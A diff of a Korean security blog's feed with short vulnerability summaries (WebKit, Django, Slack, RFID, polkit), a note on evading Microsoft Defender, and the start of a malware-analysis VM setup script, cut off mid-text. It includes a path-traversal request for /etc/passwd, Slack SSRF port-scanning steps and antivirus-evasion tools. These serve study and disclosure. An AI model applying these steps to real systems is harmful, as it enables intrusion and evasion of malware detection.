@@ -4,6 +4,554 @@
   
   
   <entry>
+    <title>[하루한줄] CVE-2021-21779: Webkit Webcore use-after-free</title>
+    <link href="/2021/06/12/fabu1ous/2021-06-12/"/>
+    <url>/2021/06/12/fabu1ous/2021-06-12/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1238">Webkit WebCore::GraphicsContext use-after-free vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>WebKitGTK 2.30.4</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>WebkitGTK 2.30.4의 GraphicsContext는 특정 이벤트를 핸들 할 때 use-after-free 취약점이 발생합니다. Webkit은 오픈소스 웹 콘텐츠 엔진으로 브라우저를 비롯한 여러 응용프로그램에서 사용합니다.</p><p>Webkit의 <code>fillText()</code> 함수는 HTMLCanvasElement 내부 특정 좌표에 문자열을 출력합니다. HTMLCanvasElement는 <code>m_width</code>와 <code>m_height</code>값을 갖고 있는데 이에 맞춰 <code>fillText()</code> 함수가 출력할 문자열의 좌표가 유효한 범위 내에 있는지 검사합니다.</p><p>HTMLCanvasElement는 백그라운드에서 수행된 변경 사항에 따라 <code>m_height</code> 값을 업데이트하지만 업데이트되기 이전의 <code>m_height</code>값을 사용해 메모리를 할당합니다. 또한 <code>fillGradient()</code> 함수가 호출되면 업데이트되기 이전의 값을 사용해 할당 해제된 메모리에 접근합니다.</p><p>위 취약점을 악용한 웹사이트에 접속할 경우 information leak 및 추가 memory corruption에 의한 피해를 볼 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>use after free</tag>
+      
+      <tag>uaf</tag>
+      
+      <tag>webkit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-33203: Django path traversal vulnerability</title>
+    <link href="/2021/06/11/l0ch/2021-06-11/"/>
+    <url>/2021/06/11/l0ch/2021-06-11/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬으로 작성된 오픈소스 웹 프레임워크 Django에서는  <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 path traversal 취약점이 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code> 와 같이 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>path traversal</tag>
+      
+      <tag>django</tag>
+      
+      <tag>python</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] 헤더 수정을 통한 Slack infra metadata 유출</title>
+    <link href="/2021/06/10/idioth/2021-06-10/"/>
+    <url>/2021/06/10/idioth/2021-06-10/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/727330">Header modification results in disclosure of Slack infra metadata to unauthorized parties</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Slack</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>클라우드 기반 팀 협업 도구 Slack의 <em>files.slack.com</em> 도메인에서 호스트 헤더 대신 <code>X-Forwarded-Host</code> 헤더를 사용하여 infra metadata를 유출할 수 있는 취약점이 발견되었습니다.</p><p>호스트가 <em>files.slack.com</em>이 아닐 때, 해당 URL은 500 Internal server error를 반환하는 유효성 검사가 존재합니다. 하지만 호스트 이름의 끝 부분에 ‘@’를 추가하여 해당 검사를 우회할 수 있습니다. 또한 해당 request는 프론트 엔드가 아닌 백 엔드로 전달되어 Blind SSRF 취약점이 존재하면 인트라넷에 arbitrary request를 전송하여 응답 시간을 통해 다양한 정보를 확인할 수 있습니다.</p><p>이를 통해 인트라넷에 열려있는 포트를 확인하는 과정은 다음과 같습니다.</p><ol><li><p>슬랙에 파일을 업로드하고 “Open original”을 통해 원본 이미지 경로를 찾아 burp suite로 가져옵니다.</p></li><li><p>repeater로 전송하고 클릭하여 정상적으로 접근되는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: xxx.com</code>을 헤더에 추가하여 500 error가 발생하는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: file.slack.com@YOUR_DOMAIN</code>으로 헤더를 수정하고 302 response가 오는지 확인합니다. 경로는 <code>YOUR_DOMAIN/files-pri/...</code>로 지정합니다.</p></li><li><p>도메인에 request가 전송되었는지 확인하고 도메인을 인트라넷 IP로 변경합니다. 포트를 바꿔가며 응답 시간을 확인합니다.</p></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>information disclosure</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>slack</tag>
+      
+      <tag>ssrf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-33881: RFID tear off attack, bypass monotonic counter</title>
+    <link href="/2021/06/09/fabu1ous/2021-06-09/"/>
+    <url>/2021/06/09/fabu1ous/2021-06-09/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html#eeprom-tear2">RFID: Monotoic Counter Anti-Tearing Defeated</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MIFARE Ultralight EV1, MF0UL</p><p>MIFARE Ultralight C, MF0ICU</p><p>MIFARE Ultralight NANO, MF0UN</p><p>NT2L1, NT2H10, NT2H12</p><p>N2H13, NT2H15, NT2H16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NXP MIFARE Ultralight와 NTAG 카드는 replay 공격을 방지하기 위한 Monotonic Counter 기능을 사용하는데 해당 기능을 tear off 공격을 통해 무력화할 수 있는 취약점이 발견되었습니다. Tear off 공격이란 RFID 태그와 리더 사이 데이터 통신이 이루어지는 도중에 통신을 끊어버리는 공격 방식으로 EEPROM이 쓰기 작업을 하는 동안 RFID 태그의 데이터가 일관되지 않은 상태로 유지되어 버그가 발생하도록 유도합니다.</p><p>MIFARE Ultralight EV1은 24-bit Monotonic Counter를 사용하고 이와 관련된 커멘드를 사용합니다.</p><ol><li><code>INCR_CNT</code> : Counter를 증가시킨다.</li><li><code>READ_CNT</code> : 현태 Counter의 값을 읽는다.</li><li><code>CHECK_TEARING_EVENT</code> : anti-tearing 8-bit flag를 검증한다.</li></ol><p><code>INCR_CNT</code>를 통해 유효한 Counter의 값을 증가 시킴과 동시에 tear off 공격을 수행하면 Counter에 대한 쓰기 작업에 인터럽트를 걸 수 있고, <code>READ_CNT</code>가 이전 Counter의 값을 리턴하면서 <code>CHECK_TEARING_EVENT</code>가 정상적인 검증 flag를 리턴하는 상황을 만들 수 있습니다. </p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>bypass</tag>
+      
+      <tag>rfid</tag>
+      
+      <tag>monotonic counter</tag>
+      
+      <tag>tear off</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-3560: Ubuntu/Fedora 인증 관리 프로그램 polkit의 로컬 권한 상승 취약점</title>
+    <link href="/2021/06/08/l0ch/2021-06-08/"/>
+    <url>/2021/06/08/l0ch/2021-06-08/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/180">CVE-2021-3560 polkit: local privilege escalation using polkit_system_bus_name_get_creds_sync()</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>polkit 0.113 ~ 0.118</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>polkit은 Unix 계열 OS(Ubuntu, Fedora 등의 리눅스 배포판)에서 시스템 전반의 인증을 통제하는 프로그램으로, sudo 등 기존 인증 시스템과 달리 느슨한 수준의 인증을 수행해 권한이 없는 프로세스가 권한 있는 계정과 커뮤니케이션을 할 수 있습니다.</p><p><img src="/2021/06/08/l0ch/2021-06-08/1.png"></p><blockquote><p>출처 : <a href="https://ko.wikipedia.org/wiki/%ED%8F%B4%ED%82%B7">위키백과</a></p></blockquote><p>polkit은  <code>polkit_system_bus_name_get_creds_sync()</code> 함수를 사용해 권한이 필요한 작업을 요청하는 프로세스의 uid 및 pid를 가져옵니다. 해당 함수는 요청 프로세스의 고유한 bus name을 <a href="https://ko.wikipedia.org/wiki/D-Bus">D-bus</a>의 <code>dbus-daemon</code>에 전송해 요청 프로세스의 권한을 확인하는데, 권한 상승 취약점은 함수 호출 직전에 요청 프로세스와 <code>dbus-daemon</code>의 연결이 끊어질 때 발생합니다. <code>dbus-daemon</code>은 연결이 끊어진 프로세스의 bus name이 유효하지 않으므로 error 응답을 보내지만 <code>polkit_system_bus_name_get_creds_sync()</code> 함수에서 이를 확인하지 않아 성공적으로 프로세스의 정보를 가져왔다는 의미의 TRUE를 반환합니다. 해당 함수의 호출자 일부는 추가적인 검증 없이 0으로 초기화된 <code>AsyncGetBusNameCredsData</code> 구조체를 참조하게 되어 요청 프로세스의 uid를 0으로 생각하고 root 프로세스가 요청한 것으로 작업을 수행합니다.</p><p>취약점의 패치 정보는 <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a">https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a</a>  에서 확인할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>lpe</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>ubuntu</tag>
+      
+      <tag>local privilege escalation</tag>
+      
+      <tag>fedora</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] 간단한 Defender 우회 방법</title>
+    <link href="/2021/06/07/idioth/2021-06-07/"/>
+    <url>/2021/06/07/idioth/2021-06-07/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/">How to bypass Defender in a few easy steps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안티 바이러스는 기본적으로 signature detection, heuristics detection, in memory detection을 통해 악성코드를 탐지합니다.</p><p>signature의 경우 이미 알려진 악성코드의 파일 전체의 해쉬 값이나 악성 행위를 하는 부분의 일부 해쉬 값과 비교하여 악성코드를 탐지합니다. heuristics는 signature 탐지 다음 단계에서 진행되는 것으로 악성코드를 에뮬레이팅하여 어셈블리나 코드를 살펴보고 어떠한 행위를 하는지 확인하여 악성코드를 탐지합니다. 하지만, 디스크에 파일이 없는 fileless 악성코드(powershell, vba macro, reflection for c# assembly)의 경우 Microsoft Defender는 <a href="https://docs.microsoft.com/ko-kr/windows/win32/amsi/antimalware-scan-interface-portal">AMSI</a> 스캔을 통해 악성코드를 탐지합니다.</p><p>signature detection을 우회하기 위해서는 어떠한 부분을 안티 바이러스가 악성코드로 판단했는지 알아내야 합니다. AntiScan.me, VirusTotal에서 <code>DefenderCheck</code>, <code>Find-AVSignature</code> 등을 활용하여 판단하는 부분을 찾아낸 후 해당 문자열을 리팩터링하거나 어셈블리를 수정할 수 있지만 각 안티 바이러스마다 수행하거나 파일이 손상될 가능성이 존재합니다. 따라서 <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> 같은 도구를 통해 코드를 난독화하여 signature detection을 우회할 수 있습니다.</p><p>C#으로 작성된 악성코드의 경우 <a href="https://github.com/Flangvik/NetLoader">NetLoader</a>를 사용하여 heuristics detection과 in memory detection을 우회할 수 있습니다. NetLoader는 C# 어셈블리를 경로, URL이나 SM 공유에서 reflection을 통해 로드합니다. 디스크에 악성 파일이 존재하지 않아 heuristics detection을 우회할 수 있고 Microsoft에서 NetLoader에 signature를 추가하지 않아 in memory detection 또한 우회할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>idioth</tag>
+      
+      <tag>malware</tag>
+      
+      <tag>bypass</tag>
+      
+      <tag>defender</tag>
+      
+      <tag>signature</tag>
+      
+      <tag>heuristic</tag>
+      
+      <tag>antivirus</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[Research] 악성코드 분석용 VM 세팅을 자동화해보자!</title>
+    <link href="/2021/06/06/idioth/setting_malware_vm/"/>
+    <url>/2021/06/06/idioth/setting_malware_vm/</url>
+    
+    <content type="html"><![CDATA[<h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요. idioth입니다. 오늘 가져온 주제는 “악성코드 분석용 가상 머신 설정 자동화”입니다.</p><p>닝겐은 귀찮은 행동을 하기 싫어합니다.(저만 그런 건 아니겠죠?) 보통 악성코드 분석은 가상 머신에서 수행하고, 또 분석용 VM을 여러 개 들고 있거나 아니면 다른 PC에 설치해야 할 일 등이 있죠. 예를 들어 저 같은 경우는 집에 있는 데스크톱과 학교나 카페 등에서 사용하는 노트북으로 나뉘어 있습니다.</p><p>Windows 가상 머신에다가 이런저런 도구들을 설정하면 용량이 커져서 압축하거나 옮기는 데에도 시간이 꽤 걸립니다. 밖에 있는데 노트북을 포맷하거나 하는 상황이 발생하면 Windows 가상 머신을 새로 만들어서 설정을 쭉 해야 하죠.</p><p>포너블을 공부할 때 사용하는 우분투에서는 제가 사용하는 툴 등을 쉘 스크립트로 다운로드 및 설정하게 만들어서 리눅스를 사용할 때 쉘 스크립트만 실행하고 딴짓을 하다 오면 세팅이 다 되는데 Windows도 가능할까?라는 생각에서 시작했습니다.</p><p><a href="https://github.com/fireeye/flare-vm">FireEye에서 배포하는 FlareVM</a>도 존재하지만 모든 툴을 다 다운로드하기도 하고 오래 걸리면 하루 종일 걸리는 경우도 있더라고요… 그래서 거기서 영감을 얻어서 제가 자주 사용하는 툴들로 구성하여 작성을 해보았습니다.(FlareVM에서 가져온 코드도 있습니다 😂)</p><p>본래 SSG 동아리 내부에서 악성코드 관련 스터디 등을 할 때 스크립트 주면서 이거 실행하면 될 거야~ 했는데 그걸 그대로 블로그에 올리기에는 코드가 너무 처참해서… (매우 더럽습니다.) 이번 기회에 깔끔하게 작성했습니다.(물론 제 기준에서만 깔끔할 수도 있어요! 양해 바랍니다. 🙂   </p><p>파트는 크게 두 가지로 나뉠 예정입니다. 첫 번째 파트에서는 Windows 설정에 대한 스크립트를 작성할 예정이고, 두 번째 파트에서는 <a href="https://chocolatey.org/">chocolatey</a>를 활용한 툴들을 설치할 겁니다!</p><h1 id="무엇을-설정해야-할까"><a href="#무엇을-설정해야-할까" class="headerlink" title="무엇을 설정해야 할까?"></a>무엇을 설정해야 할까?</h1><p>가장 먼저 스크립트를 통해서 무엇을 해야 할지 정리를 하고 시작합시다. 아무래도 악성코드 분석을 해야 하므로 Windows Defender와 Windows Update는 꺼놓는 것이 좋겠죠? 시작 프로그램에 등록되었을 때 복잡하게 하지 않기 위해서 시작 프로그램도 정리하고… 사용하지 않는 기본 앱 삭제 등… 제가 생각나는 대로 간단하게 정리해보았습니다.</p><ol><li>사용하지 않는 기본 앱 삭제</li><li>방화벽 비활성화</li><li>Windows Update 비활성화</li><li>Windows Defender 비활성화</li><li>보안유지 정책 알림 비활성화</li><li>작업 스케줄러 삭제</li><li>시작 프로그램 삭제</li><li>숨김 파일 표시</li></ol><p>Windows에서 쉘 스크립트로 한 번에 설정을 한다고? 뭔가 낯설게 느껴지시는 분들도 계시겠지만 Windows에는 Powershell이 존재합니다. Powershell을 사용해서 위의 작업들을 하나하나 진행해봅시다!</p><h1 id="사용하지-않는-기본-앱-삭제"><a href="#사용하지-않는-기본-앱-삭제" class="headerlink" title="사용하지 않는 기본 앱 삭제"></a>사용하지 않는 기본 앱 삭제</h1><p>처음 Windows를 설치하면 3D 뷰어나, BingFinance, OfficeHub 등등 악성코드 분석에는 활용되지 않는 애플리케이션들이 많이 설치되어 있습니다. 이런 앱을 손수 지울 수도 있으나 <code>Remove-AppxPackage</code> 명령어를 통해서 삭제할 수 있습니다.</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> Microsoft.XboxAppName              : Microsoft.XboxAppPublisher         : CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=USArchitecture      : X64ResourceId        :Version           : <span class="hljs-number">48.76</span>.<span class="hljs-number">8001.0</span>PackageFullName   : Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweInstallLocation   : C:\Program Files\WindowsApps\Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweIsFramework       : FalsePackageFamilyName : Microsoft.XboxApp_8wekyb3d8bbwePublisherId       : <span class="hljs-number">8</span>wekyb3d8bbweIsResourcePackage : FalseIsBundle          : FalseIsDevelopmentMode : FalseNonRemovable      : FalseDependencies      : &#123;Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27413</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27422</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktop_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3                    d8bbwe...&#125;IsPartiallyStaged : FalseSignatureKind     : StoreStatus            : Ok</code></pre><p>예를 들어 XboxApp의 경우 분석에서는 아예 사용하지 않겠죠? <code>Get-AppxPackage</code>를 통해 패키지의 정보를 가져올 수 있고, 파이프라인으로 <code>Remove-AppxPackage</code>를 사용하면 해당 패키지가 삭제됩니다.</p><p>이를 토대로 작성한 소스 코드는 아래와 같습니다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(    <span class="hljs-string">&quot;7EE7776C.LinkedInforWindows&quot;</span>    <span class="hljs-string">&quot;C27EB4BA.DropboxOEM&quot;</span>    <span class="hljs-string">&quot;Microsoft.3DBuilder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.Advertising.Xaml&quot;</span>    <span class="hljs-string">&quot;Microsoft.Appconnector&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFinance&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFoodAndDrink&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingHealthAndFitness&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingNews&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingSports&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingTravel&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingWeather&quot;</span>    <span class="hljs-string">&quot;Microsoft.CommsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ConnectivityStore&quot;</span>    <span class="hljs-string">&quot;Microsoft.DesktopAppInstaller&quot;</span>    <span class="hljs-string">&quot;Microsoft.Getstarted&quot;</span>    <span class="hljs-string">&quot;Microsoft.Messaging&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftOfficeHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftSolitaireCollection&quot;</span>    <span class="hljs-string">&quot;Microsoft.MixedReality.Portal&quot;</span>    <span class="hljs-string">&quot;Microsoft.Netflix&quot;</span>    <span class="hljs-string">&quot;Microsoft.NetworkSpeedTest&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Desktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.OneNote&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Sway&quot;</span>    <span class="hljs-string">&quot;Microsoft.OfficeLens&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneConnect&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneDrive&quot;</span>    <span class="hljs-string">&quot;Microsoft.People&quot;</span>    <span class="hljs-string">&quot;Microsoft.Print3D&quot;</span>    <span class="hljs-string">&quot;Microsoft.RemoteDesktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.SkypeApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.Wallet&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.CloudExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.NarratorQuickStart&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.PeopleExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.Photos&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsAlarms&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsCamera&quot;</span>    <span class="hljs-string">&quot;Microsoft.windowscommunicationsapps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsFeedbackHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsMaps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsReadingList&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsSoundRecorder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Xbox.TCUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameCallableUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGamingOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxIdentityProvider&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxLive&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxSpeechToTextOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.YourPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneMusic&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneVideo&quot;</span>    <span class="hljs-string">&quot;Windows.CBSPreview&quot;</span>)<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$name</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)&#123;    <span class="hljs-built_in">Get-AppxPackage</span> <span class="hljs-variable">$name</span> | <span class="hljs-built_in">Remove-AppxPackage</span>&#125;</code></pre><p><code>$packages</code>에 있는 패키지 이름을 하나씩 가져와서 삭제를 하는 부분입니다. 추가되어 있지 않은 애플리케이션도 존재하기 때문에 혹시 본인이 삭제하고 싶지 않거나 삭제하고 싶은 프로그램이 있으면 추가를 하시면 됩니다.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled.png"></p><p>삭제하고 싶은 앱이 있는데 패키지 이름을 모르시겠다고요? 걱정하지 마세요! 깔려있는 패키지를 이름으로 정렬해서 확인할 수 있습니다!</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> | <span class="hljs-built_in">Select</span> NameName----windows.immersivecontrolpanelMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Windows.PrintDialogMicrosoft.WalletMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.VCLibs.<span class="hljs-number">140.00</span>RealtekSemiconductorCorp.RealtekAudioControlMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopAdvancedMicroDevicesInc<span class="hljs-literal">-2</span>.AMDRadeonSoftwareMicrosoft.XboxSpeechToTextOverlayMicrosoft.XboxGameOverlayMicrosoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.Xbox.TCUIMicrosoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.<span class="hljs-number">549981</span>C3F5F10Microsoft.StorePurchaseAppMicrosoft.LanguageExperiencePackko<span class="hljs-literal">-KR</span>Microsoft.WinDbgmicrosoft.windowscommunicationsappsMicrosoft.WebpImageExtensionMicrosoft.XboxIdentityProviderMicrosoft.DesktopAppInstallerMicrosoft.Windows.PhotosMicrosoft.WebMediaExtensionsMicrosoft.XboxAppMicrosoft.MixedReality.PortalMicrosoft.PeopleMicrosoft.WindowsStoreMicrosoft.ZuneVideoMicrosoft.Microsoft3DViewerMicrosoft.WindowsFeedbackHubMicrosoft.MicrosoftStickyNotesMicrosoft.WindowsAlarmsMicrosoft.GetHelpMicrosoft.BingWeatherMicrosoft.WindowsCameraMicrosoft.ScreenSketchMicrosoft.WindowsMapsMicrosoft.WindowsCalculatorMicrosoft.WindowsSoundRecorderMicrosoft.ZuneMusicMicrosoft.BioEnrollmentMicrosoft.Windows.CloudExperienceHostMicrosoft.Windows.OOBENetworkConnectionFlowMicrosoft.AAD.BrokerPluginMicrosoft.Windows.OOBENetworkCaptivePortalMicrosoftWindows.UndockedDevKitMicrosoft.Windows.StartMenuExperienceHostMicrosoft.Windows.ShellExperienceHostMicrosoft.Windows.SearchMicrosoft.MicrosoftEdgeMicrosoft.Windows.ContentDeliveryManagerMicrosoftWindows.Client.CBSWindows.CBSPreviewNcsiUwpAppMicrosoft.XboxGameCallableUIMicrosoft.Windows.XGpuEjectDialogMicrosoft.Windows.SecureAssessmentBrowserMicrosoft.Windows.SecHealthUIMicrosoft.Windows.PinningConfirmationDialogMicrosoft.Windows.PeopleExperienceHostMicrosoft.Windows.ParentalControlsMicrosoft.Windows.NarratorQuickStartMicrosoft.Windows.CapturePickerMicrosoft.Windows.CallingShellAppMicrosoft.Windows.AssignedAccessLockAppMicrosoft.Windows.Apprep.ChxAppMicrosoft.Win32WebViewHostMicrosoft.MicrosoftEdgeDevToolsClientMicrosoft.LockAppMicrosoft.ECAppMicrosoft.CredDialogHostMicrosoft.AsyncTextServiceMicrosoft.AccountsControlMicrosoft.VP9VideoExtensionsMicrosoft.XboxGamingOverlayMicrosoft.HEIFImageExtensionMicrosoft.MSPaint<span 